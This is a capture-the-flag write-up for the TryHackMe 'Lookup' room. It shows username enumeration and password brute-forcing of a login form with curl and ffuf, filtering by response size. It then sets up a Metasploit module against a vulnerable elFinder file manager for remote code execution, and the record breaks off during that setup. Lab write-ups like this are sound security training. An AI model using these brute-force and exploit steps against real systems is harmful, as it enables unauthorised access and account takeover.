So My attempt is to whenever I get the IP I always hit the IP in the browser after all basic stuff that I already mentioned in Instruction.txt file.

But doing so leads a redirect to http://lookup.thm.

So we need to do a small tweak in the file */etc/hosts*
Then where you entered the ip at the end of that ip put a single space then lookup.thm and save & exit.That's It.

Then i opened http://ip and it redirected me to http://lookup.thm then i saw a login page.

But i tried to do *Directory Enumuration* so i found directories are

```
200 -    1B  - /login.php
```

That's it i got.
so the page http://lookup.thm/login.php was a login page.

<login_page>

When viewing its source code:-

<source_code>

We can see the username and password parameter in the source code clearly.
Using this parameter We will hit a curl req with below command to test for valid req.

```
curl -v -X POST http://lookup.thm/login.thm -d "username=orion&password=1234"
```
```
Wrong username or password. Please try again.
Redirecting in 3 seconds.
```
The Req header in the curl were 
```
> POST /login.thm HTTP/1.1
> Host: lookup.thm
> User-Agent: curl/8.18.0
> Accept: */*
> Content-Length: 28
> Content-Type: application/x-www-form-urlencoded

```

And it was working it gave me the real wrong credentials error that i got in browser manual login too.

That means we can do req to login.thm in this way.

But without jumping to password bruteforcing i tried for sqli and it was not working.

Now finally that we are waiting for..

# Bruteforcing Login Page

 For this we are going to use ffuf.
 So we will do the below command to do enumuration to login page.
 But Before doing so we need to manually send 1 req first to get the response size and number of words in a invalid response.

so as according to curl output i did 
```
ffuf -u http://lookup.thm/login.php \
-w <(echo "random_user"):USER \
-w <(echo "random_pass"):PASS \
-X POST \
-d "username=USER&password=PASS" \
```

Now what i got as output was

``` 
[Status: 200, Size: 74, Words: 10, Lines: 1, Duration: 64ms]
    * PASS: random_pass
    * USER: random_user
```
<ffuf_image>
**so as according to curl output and Now we know that invalid response have response size 74 and response words 10**
```
ffuf -v  -u http://lookup.thm/login.php \
-w /home/Seclists/Usernames/top-usernames-shortlist.txt:USER \
-w /home/Seclists/Passwords/Common-Credentials/best15.txt:PASS \
-X POST \
-d "username=USER&password=PASS" \
-H "Content-Type: application/x-www-form-urlencoded" \
-fs 74 -fw 10 
```

Now we can see for admin the response was differ. So we tried with admin username in browser and the error was 

``` 
Wrong password. Please try again.
Redirecting in 3 seconds. 
```
See the error that we got from the curl at very top and the error that we are getting now has a difference that the error that we got now tells us that username is correct.
Meaning we have found 1 valid user. We will now user another wordlist.

```
ffuf -v  -u http://lookup.thm/login.php \
-w /home/Seclists/Usernames/Names/names.txt:USER \
-w /home/Seclists/Passwords/Common-Credentials/best15.txt:PASS \
-X POST \
-d "username=USER&password=PASS" \
-H "Content-Type: application/x-www-form-urlencoded" \
-fs 74 -fw 10
```
As you run it you will find another user.
```
[Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 75ms]
| URL | http://lookup.thm/login.php
    * PASS: 111111
    * USER: admin

[Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 63ms]
| URL | http://lookup.thm/login.php
    * PASS: 111111
    * USER: jose
```

So now we have a valid another username jose. 

now we will ffuf for same user but for passwords only for the username jose.
```
ffuf -v  -u http://lookup.thm/login.php \
-w /home/Seclists/Passwords/Common-Credentials/best1050.txt:PASS \
-X POST \
-d "username=jose&password=PASS" \
-H "Content-Type: application/x-www-form-urlencoded" \
-fs 62 -fw 8
```
Now you will get the password. Login there with credentials in the web.

You will now land us to http://files.lookup.thm/ but this is not in out /etc/hosts files so we add it too into out hosts file with the command

now after adding do enter credentials again and you land at the page http://files.lookup.thm/elFinder/elfinder.html#elf_l1_Lw.
Here you can see each file open and see it. after a lot of enumuration i was able to find the version of elfinder(The web file-manager that is being used here.)

And its version was vulnerable to rce. so i used msfconsole to do this task.
to get the exploit just use the preinstalled kali tool searchsploit. by  the command searchsploit -c "elfinder with version number"
after getting the exploit.
Do start msfconsole by typing it into the terminal and when it starts do run "search <elfinder with version number>" then you will get a exploit path

Then do "use <exploit_path>"
set the rhosts to files.lookup.thm by the command set RHOSTS files.lookup.thm
set the lhost to tun0 by the command set LHOST tun0
then enter the command run and hit enter. The exploit runs.
But i got the error.
<msf_error>
so to resolving steps were : -
Set the rhosts to room_ip by the command set RHOSTS <room_ip>
Next set the vhost to files.lookup.thm by the command set VHOST files.lookup.thm
